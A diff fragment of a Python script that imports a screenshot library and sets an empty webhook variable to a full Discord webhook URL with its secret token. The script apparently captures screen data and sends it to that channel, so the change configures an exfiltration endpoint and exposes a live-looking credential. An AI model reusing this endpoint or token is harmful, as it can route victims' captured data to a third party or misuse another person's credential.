@@ -16,7 +16,7 @@ from PIL import ImageGrab
 
 # Paste your webhooh url inside ''
 
-your_webhook_url = ''
+your_webhook_url = 'https://discord.com/api/webhooks/1548346787020935219/so8aVkTx-vp8-hzni0pNKC1GQaev_yDUNILK4w9mP0JjdKE580xBp0MvCeYvGTGE3vds'
 
 #################### \_ CONFIGURATION _/ ########################
 
